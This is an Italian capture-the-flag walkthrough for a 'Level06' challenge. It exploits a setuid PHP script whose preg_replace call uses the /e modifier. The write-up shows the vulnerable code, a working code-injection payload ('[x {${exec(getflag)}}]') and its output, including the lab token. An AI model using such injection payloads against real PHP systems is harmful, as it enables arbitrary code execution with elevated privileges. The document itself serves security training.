# Level06
### 1 passaggio:
Eseguendo il comando `ls -l`:
```bash
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```
Notiamo un file eseguibile `level06` e un file php `level06.php`, l'eseguibile è l'interprete php
mentre nello script php troviamo il seguente codice:
```php
     1  #!/usr/bin/php
     2  <?php
     3  function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
     4  function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e","y(\"\\2\")",$a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
     5  $r = x($argv[1], $argv[2]); print $r;
     6  ?>
```

### 2 passaggio:
Nello script è presente la funzione `preg_replace` estremamente dannosa per l'esecuzione 
di codice arbitrario in php soprattutto se mescolata con l'opzione `/e` proprio come:
```php
$a = preg_replace("/(\[x (.*)\])/e","y(\"\\2\")",$a);
```
Poichè l'opzione `/e` fa in modo che la stringa sostitutiva venga valutata come codice php.

### 3 passaggio:
Con il comando:
```bash
echo '[x {${exec(getflag)}}]' > /tmp/flag ; ./level06 /tmp/flag 42
```
Abbiamo dunque:
```bash
PHP Notice:  Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1
```
